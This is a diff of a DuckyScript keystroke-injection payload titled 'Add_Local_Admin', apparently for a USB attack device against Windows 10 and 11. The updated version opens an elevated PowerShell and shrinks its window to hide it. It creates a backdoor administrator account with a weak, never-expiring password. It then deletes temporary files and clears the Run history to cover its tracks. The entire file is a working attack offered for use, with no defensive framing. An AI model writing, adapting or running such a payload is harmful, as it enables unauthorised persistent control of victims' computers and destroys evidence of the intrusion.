@@ -1,72 +1,42 @@
 REM Title: Add_Local_Admin
 REM Author: LulzAnarchyAnon
-REM Description: PowerShell is opened, and a script
-REM runs that adds a Local Admin User.
-REM Target: Windows 10 PowerShell
+REM Description: Administrator PowerShell is opened, and resized for a more stealthy payload delivery, then the payload
+REM creates a local admin account on the target system, afterwards powershell exits, and all history is cleared. 
+REM This lightning fast payload deployed, and was completed in a test run in 10.57 seconds
+REM Target: Windows 10 and 11  
 REM Props: Darren Kitchen, and I am Jakoby
-REM Version: 1.0
+REM Version: 3.0
 REM Category: Execution
 
-DELAY 2000
-GUI x
-DELAY 1000
-a
-DELAY 1000
-ALT y
-DELAY 1000
-ALT TAB
-DELAY 3000
 
-STRING $Username = "Admin2"
-DELAY 5000
-ENTER
-STRING $Password = "password"
-DELAY 5000
-ENTER
-STRING $group = "Administrators"
-DELAY 5000
-ENTER
-STRING $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
-DELAY 5000
-ENTER
-STRING if ($existing -eq $null) {
-DELAY 5000
-ENTER
-STRING Write-Host "Creating new local user $Username."
-DELAY 5000
-ENTER
-STRING & NET USER $Username $Password /add /y /expires:never
-DELAY 5000
-ENTER
-STRING Write-Host "Adding local user $Username to $group."
-DELAY 5000
-ENTER
-STRING & NET LOCALGROUP $group $Username /add
-DELAY 5000
-ENTER
-STRING }
-DELAY 2000
-ENTER
-STRING {
-DELAY 2000
-ENTER
-STRING Write-Host "Setting password for existing local user $Username."
-DELAY 5000
-ENTER
-STRING $existing.SetPassword($Password)
-DELAY 5000
-ENTER
-STRING }
-DELAY 2000
-ENTER
-STRING Write-Host "Ensuring password for $Username never expires."
-DELAY 5000
-ENTER
-STRING & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
-DELAY 5000
-ENTER
-DELAY 2000
-STRING exit
-DELAY 100
-ENTER
-$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+DELAY 200
+GUI r
+DELAY 200
+STRINGLN powershell -Command "Start-Process PowerShell -Verb RunAs"  
+DELAY 500
+ALT y
+DELAY 500
+STRINGLN
+                 PowerShell.exe -noe -c ". mode.com con: lines=5 cols=12"
+                 $Username = "Admin2"
+                 $Password = "password"
+                 $group = "Administrators"
+                 $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+                 $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+                 if ($existing -eq $null) {
+                 Write-Host "Creating new local user $Username."
+                 & NET USER $Username $Password /add /y /expires:never
+                 Write-Host "Adding local user $Username to $group."
+                 & NET LOCALGROUP $group $Username /add
+                 }
+                 {
+                Write-Host "Setting password for existing local user $Username."
+                $existing.SetPassword($Password)
+                }
+               Write-Host "Ensuring password for $Username never expires."
+               & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+               rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+               reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+               exit
+               exit
+END_STRINGLN
